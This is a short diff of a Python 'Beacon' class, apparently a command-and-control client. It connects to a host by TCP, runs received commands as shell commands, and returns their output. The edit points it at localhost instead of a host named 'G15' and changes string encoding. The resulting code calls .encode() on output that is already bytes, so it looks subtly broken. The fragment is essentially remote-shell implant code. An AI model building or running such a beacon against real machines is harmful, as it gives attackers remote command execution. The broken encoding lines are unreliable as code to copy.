@@ -22,16 +22,16 @@ class Beacon:
          ps = subprocess.run(cmd, shell=True, capture_output=True,check=True)
          if self.debugging == True:
             print("Sending:" ,ps.stdout)
-         if ps.stdout != None and ps.stdout!= "":
-            self.sock.send(ps.stdout)
+         if ps.stdout != None and ps.stdout != b'':
+            self.sock.send(ps.stdout.encode())
          else:
-            self.sock.send("SUCCESS")
+            self.sock.send("SUCCESS".encode())
       except Exception as e:
                      error_msg = f"ERROR: {str(e)}"
                      if self.debugging == True:
                         print(error_msg)
                      self.sock.send(error_msg.encode())
-       
+
    def start(self):
       self.running = True
       self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -60,7 +60,7 @@ class Beacon:
       self.sock.close()
 
 def main():
-   beacon = Beacon("G15",10267)
+   beacon = Beacon("localhost",10267)
    while True:
       try:
          beacon.start()
